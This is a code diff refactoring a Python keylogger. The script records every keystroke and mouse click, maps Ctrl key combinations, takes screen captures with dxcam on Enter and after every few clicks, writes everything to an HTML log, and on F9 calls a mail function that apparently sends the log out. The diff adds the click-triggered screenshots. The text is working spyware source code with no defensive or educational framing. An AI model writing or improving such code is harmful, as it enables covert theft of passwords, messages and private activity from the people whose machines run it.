@@ -18,7 +18,10 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 
-def add_color(s, color) -> None:
+def add_color(
+    s: str,
+    color: str
+  ) -> None:
   return f"<font color=\"{color}\">{s}</font>"
 
 def get_time() -> str:
@@ -33,8 +36,7 @@ def print_traceback() -> None:
 def get_screenshot() -> None:
   try:
     idx = len(os.listdir("./s_manifest"))
-    img = cam.grab()
-    img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
+    img = cv2.cvtColor(cam.grab(), cv2.COLOR_BGR2RGB)
     cv2.imwrite(f"./s_manifest/s{idx}.jpg", img)
     log_f.write(add_color(f"「s{idx}」 ", "blue"))
   except:
@@ -42,48 +44,36 @@ def get_screenshot() -> None:
 
 
 def keyboard_press(
-    key: pynput.keyboard.Key
+    key
   ) -> None:
   """
   on_press for keyboard listener.
   """
-  # Check if it's an alphanumeric key
-  try:
-    # Check if it's a combination key - goes with Ctrl
-    try:
-      key = SPE_CTRL[str(key).replace("'", "")]
-      key = add_color(key, "green")
-
-    # This can cause ValueError (if it's not a combination key)
-    except KeyError:
-      key = key.char
-
-  # This can cause AttributeError (if it's a special key)
-  except AttributeError:
-    if key == pynput.keyboard.Key.f9:
-      # Press F9 -> send mail AND terminate
+  if isinstance(key, pynput.keyboard.KeyCode):
+    k = key.char
+    if key.vk in SPE_CTRL and SPE_CTRL[key.vk] != k:
+      k = add_color(f"「{SPE_CTRL[key.vk]}」", "green")
+    if k == '<':   k = "「less」"
+    elif k == '>': k = "「greater」"
+  elif isinstance(key, pynput.keyboard.Key):
+    k = key.name
+    if k == "f9":
       log_f.write(add_color(f"<br><br>「Keylogger terminated {get_time()}」 ", "blue"))
       send_mail()
       os._exit(0)
-    elif key == pynput.keyboard.Key.enter:
-      # Enter -> create new line in log file + get time
-      key = add_color(f"<br>「↩ {get_time()}」", "blue")
+    elif k == "enter":
+      k = add_color(f"<br>「↩ {get_time()}」", "blue")
       get_screenshot()
-    elif key == pynput.keyboard.Key.backspace:
-      key = add_color("「⌫」", "green")
-    elif key == pynput.keyboard.Key.delete:
-      key = add_color("「⌦」", "green")
-    elif key == pynput.keyboard.Key.space:
-      key = add_color("「_」", "green")
-    else:
-      key = key.name \
-            .replace("_l", "").replace("_r", "").replace("_gr", "")
-      if key == "shift":
-        key = "⬆"
-      elif key == "tab":
-        key = "↹"
-      key = add_color(f"「{key}」", "green")
-  log_f.write(key)
+      return
+    elif k == "backspace": k = '⌫'
+    elif k == "delete":    k = '⌦'
+    elif k == "space":     k = '_'
+    elif 'shift' in k:     k = '⬆'
+    elif k == "tab":       k = '↹'
+    k = add_color(f"「{k}」", "green")
+  else:
+    k = add_color("「Unhandled key」", "red")
+  log_f.write(k)
 
 
 def mouse_click(
@@ -95,8 +85,13 @@ def mouse_click(
   """
   on_click for mouse listener.
   """
-  if pressed:
-    log_f.write(add_color(f"<br>「🖱️ {x} {y} {button.name} {get_time()}」 ", "blue"))
+  if not pressed:
+    return
+  log_f.write(add_color(f"<br>「🖱️ {x} {y} {button.name} {get_time()}」 ", "blue"))
+  global click_count
+  click_count = (click_count + 1) % CLICK_FREQ
+  if click_count == 0:
+    get_screenshot()
 
 
 def send_mail() -> None:
@@ -147,24 +142,21 @@ def send_mail() -> None:
 
 if __name__ == "__main__":
   SPE_CTRL = {
-    'A': '\\x01', 'B': '\\x02', 'C': '\\x03', 'D': '\\x04', 'E': '\\x05',
-    'F': '\\x06', 'G': '\\x07', 'H': '\\x08', 'I': '\\t', 'J': '\\n',
-    'K':'\\x0b', 'L': '\\x0c', 'M': '\\r', 'N': '\\x0e', 'O': '\\x0f',
-    'P': '\\x10', 'Q': '\\x11', 'R': '\\x12', 'S': '\\x13', 'T': '\\x14',
-    'U': '\\x15', 'V': '\\x16', 'W': '\\x17', 'X': '\\x18', 'Y': '\\x19',
-    'Z': '\\x1a', '0': '<48>', '1': '<49>', '2': '<50>', '3': '<51>',
-    '4': '<52>', '5': '<53>', '6': '<54>', '7': '<55>', '8': '<56>',
-    '9': '<57>'
+    192: '`', 49: '1', 50: '2', 51: '3', 52: '4', 53: '5', 54: '6', 55: '7',
+    56: '8', 57: '9', 48: '0', 189: '-', 187: '=', 81: 'q', 87: 'w', 69: 'e',
+    82: 'r', 84: 't', 89: 'y', 85: 'u', 73: 'i', 79: 'o', 80: 'p', 219: '[',
+    221: ']', 220: '\\', 65: 'a', 83: 's', 68: 'd', 70: 'f', 71: 'g', 72: 'h',
+    74: 'j', 75: 'k', 76: 'l', 186: ';', 222: "'", 90: 'z', 88: 'x', 67: 'c',
+    86: 'v', 66: 'b', 78: 'n', 77: 'm', 188: ',', 190: '.', 191: '/'
   }
 
   # Initialization
-  try:
+  if not os.path.exists("./s_manifest"):
     os.mkdir("./s_manifest")
-  except FileExistsError:
-    pass
   cam = dxcam.create()
   log_f = open("./s_manifest/log.txt", mode="a+", encoding="utf-8")
   log_f.write(add_color(f"<br><br>「Keylogger started {get_time()}」<br>", "blue"))
+  click_count = 0
 
   # Create threads
   keyboard = pynput.keyboard.Listener(on_press=keyboard_press)
